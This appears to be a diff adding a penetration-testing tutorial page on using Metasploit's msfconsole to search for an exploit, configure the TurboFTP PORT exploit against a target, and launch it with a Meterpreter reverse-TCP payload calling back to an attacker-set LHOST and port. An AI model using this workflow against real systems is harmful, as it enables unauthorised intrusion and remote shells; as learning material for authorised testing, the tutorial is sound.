@@ -1,0 +1,88 @@
+# Gaining access with Metasploit {-}
+
+**Metasploit** is an open source framework used for penetration testing and exploit development. **Metasploit** gives a wide array of 
+community contributed exploits and attack vectors. It's also used to automate your own exploits.
+
+The basic workflow to exploit a target by using **MSFConsole** is:  
+- Vulnerable service identification
+- Search for a proper exploit fot that service
+- Loading and configuration of that exploit
+- Loading and configuration of the the desired payload
+- Run of the exploit code and get access to the vulnerable machine
+
+You can start **Metasploit** by typing:
+
+```bash
+msfconsole
+```
+
+## Search for a proper exploit {-}
+
+```bash
+msf6 > search <my search term>
+```
+
+another way to look for exploit is by using the show command.
+
+```bash
+msf6 > show exploits
+```
+
+It's not a good way for finding exploits as Metasploit have more than thousands of exploits.
+
+## Use the desired exploit {-}
+
+```bash
+msf6 > use exploit/windows/ftp/turboftp_port
+msf6 exploit(turboftp_port) >
+```
+
+At this point you can check the exploit info by typing:
+
+```bash
+msf6 exploit(turboftp_port) > info
+```
+
+or go back to the main msf console by typing
+
+```bash
+msf6 exploit(turboftp_port) > back
+```
+The command **show options** gives you the informations needed to use the exploit and the **set** command is needed to configure those options.
+
+```bash
+msf6 exploit(turboftp_port) > show options
+msf6 exploit(turboftp_port) > set RHOST 10.10.10.5
+msf6 exploit(turboftp_port) > set FTPUSER god
+msf6 exploit(turboftp_port) > set FTPASS S@v3TH3Qu33n!
+```
+
+## Run the exploit {-}
+
+To run an exploit, a **Payload** is needed. The payload is used to get:  
+
+- a shell  
+- a vnc or rdp connection  
+- a **Meterpreter shell**  
+- the execution of an attacker-supplied application  
+
+To list the payloads of the specific choosen exploit, use the following command
+
+```bash
+msf6 exploit(turboftp_port) > show payloads
+```
+
+You can then choose the payload you want with the **set** command:
+
+```bash
+msf6 exploit(turboftp_port) > set payload windows/meterpreter/reverse_tcp
+```
+
+And again configure the payload and you will be good to go for launching the attack.
+
+```bash
+msf6 exploit(turboftp_port) > set LHOST 10.10.10.2
+msf6 exploit(turboftp_port) > set LPORT 1234
+
+msf6 exploit(turboftp_port) > exploit
+```
